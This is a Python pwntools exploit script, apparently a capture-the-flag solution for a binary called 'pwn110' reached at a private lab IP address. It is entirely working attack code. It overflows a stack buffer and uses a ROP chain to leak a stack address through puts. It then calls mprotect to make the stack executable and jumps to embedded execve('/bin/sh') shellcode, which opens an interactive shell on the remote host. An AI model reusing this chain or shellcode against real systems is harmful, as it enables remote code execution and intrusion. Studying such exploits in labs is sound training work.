
from pwn import * #ELF, process, remote, p64
import struct


context.binary = binary = ELF('./pwn110')
context.log_level = "debug"

stack = 0x00007ffffffdd000
mprotect = 0x449b70
shellInStack = 0x7fffffffd9d6  # 0x7ffe5ef09a36 #0x00007fffffffd960
nops        = b"\x90"*8
shellCode   = b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"

pad = b'A'*0x28 #(40-len(nops)-len(shellCode))


pop_rdi_ret = p64(0x000000000040191a)
pop_rsi_ret = p64(0x000000000040f4de)
pop_rcx_ret = p64(0x000000000041139b) #pop rcx; add rsp, 0xe8; mov eax, r8d; pop rbx; pop rbp; ret;
pop_rdx_ret = p64(0x000000000040181f)
mov_rcx_ret = p64(0x0000000000419825) #mov rcx, rdx; add rax, rcx; mov qword ptr [rdi + 0x18], rsi; mov qword ptr [rdi + 8], rax; xor eax, eax; ret;
jmp_rsp     = p64(0x0000000000463c43)
ret_gadget  = p64(0x0000000000401e60)

libc_end = p64(binary.sym.__libc_stack_end)
puts_adr = p64(binary.sym._IO_puts)
main_adr = p64(binary.sym.main)

rop  = pop_rdx_ret
rop += p64(0x07)
rop += mov_rcx_ret
rop += pop_rdi_ret
#rop += p64(stack)
rop += pop_rsi_ret
rop += p64(0x101010)
rop += p64(mprotect)

payload  = b'A'*40
payload += pop_rdi_ret
payload += libc_end
payload += puts_adr
payload += main_adr

p = remote('10.10.180.164', 9010)
#p = process()
#p = gdb.debug('./pwn110')

p.sendline(payload) #+jmp_rsp+nops+shellCode)
recs = p.recv()
stack = recs.split(b' ')[-1].replace(b'\n', b'')
stack = stack.ljust(8, b'\x00')
stack = (u64(stack)) &~0xfff
print("Stack: ", hex(stack))
rop  = pop_rdx_ret
rop += p64(0x07)
rop += mov_rcx_ret
rop += pop_rdi_ret
rop += p64(stack)
rop += pop_rsi_ret
rop += p64(0x101010)
rop += p64(mprotect)

p.sendline(pad+ret_gadget+rop+jmp_rsp+nops+shellCode)

#try:
#    rev = p.recv()
#    print(rev)
#except:
#    pass

with open('exp', 'bw') as file:
    file.write(payload+b'  '+pad+ret_gadget+rop+jmp_rsp+nops+shellCode)

p.interactive()
